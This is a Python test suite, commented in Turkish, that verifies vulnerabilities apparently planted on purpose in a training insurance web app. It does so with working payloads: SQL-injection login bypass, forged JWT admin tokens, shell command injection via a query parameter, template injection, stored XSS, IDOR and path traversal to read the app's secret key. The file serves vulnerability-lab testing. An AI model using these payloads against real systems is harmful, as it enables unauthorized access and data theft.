"""
Zafiyet doğrulama testleri.

Bu testler zafiyetlerin GERÇEKTEN var olduğunu kanıtlar. Bir zafiyet
düzeltildiğinde ilgili test kırılır; düzeltme dalında test, "artık
sömürülemiyor" şeklinde ters çevrilerek doğrulama testi olarak kullanılır.
"""

import os
import sys

import jwt
import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "app"))


@pytest.fixture()
def istemci(tmp_path, monkeypatch):
    monkeypatch.setenv("SIGORTALAB_DB", str(tmp_path / "test.db"))
    import importlib
    import app as uygulama_modulu

    importlib.reload(uygulama_modulu)
    uygulama_modulu.db_hazirla()
    uygulama_modulu.app.config["TESTING"] = True
    with uygulama_modulu.app.test_client() as c:
        yield c


def giris_yap(istemci, kullanici_adi, sifre):
    return istemci.post("/giris", data={"kullanici_adi": kullanici_adi, "sifre": sifre})


def test_z05_sql_enjeksiyonu_ile_sifresiz_giris(istemci):
    yanit = giris_yap(istemci, "admin' --", "herhangi")
    assert yanit.status_code == 302
    assert "oturum" in yanit.headers.get("Set-Cookie", "")


def test_z06_veritabani_hatasi_sizdiriliyor(istemci):
    yanit = giris_yap(istemci, "'", "x")
    assert yanit.status_code == 500
    assert b"Veritaban" in yanit.data


def test_z08_idor_baskasinin_hasar_dosyasi(istemci):
    giris_yap(istemci, "ayse", "ayse123")
    yanit = istemci.get("/hasar/3")  # Mehmet'in dosyası
    assert yanit.status_code == 200
    assert "06 XYZ 987" in yanit.get_data(as_text=True)


def test_z04_imzasiz_token_ile_admin_olma(istemci):
    sahte = jwt.encode({"id": 2, "kullanici_adi": "ayse", "rol": "admin"}, "yanlis-anahtar", algorithm="HS256")
    istemci.set_cookie("localhost", "oturum", sahte)
    yanit = istemci.get("/eksper/plaka-sorgu?plaka=34ABC123")
    assert yanit.status_code == 200


def test_z14_komut_enjeksiyonu(istemci):
    sahte = jwt.encode({"id": 1, "kullanici_adi": "x", "rol": "admin"}, "a", algorithm="HS256")
    istemci.set_cookie("localhost", "oturum", sahte)
    yanit = istemci.get("/eksper/plaka-sorgu?plaka=34ABC;echo ENJEKSIYON_BASARILI")
    assert "ENJEKSIYON_BASARILI" in yanit.get_data(as_text=True).split("\n", 1)[1]


def test_z11_ssti(istemci):
    yanit = istemci.get("/ara?q={{7*7}}")
    assert "Aranan: 49" in yanit.get_data(as_text=True)


def test_z09_kalici_xss(istemci):
    giris_yap(istemci, "ayse", "ayse123")
    istemci.post("/hasar/yeni", data={"police_no": "P", "plaka": "X", "tutar": "1", "aciklama": "<script>alert(1)</script>"})
    yanit = istemci.get("/hasar/4")
    assert "<script>alert(1)</script>" in yanit.get_data(as_text=True)


def test_z12_dizin_gecisi(istemci):
    yanit = istemci.get("/belge?dosya=../app.py")
    assert yanit.status_code == 200
    assert b"JWT_ANAHTARI" in yanit.data
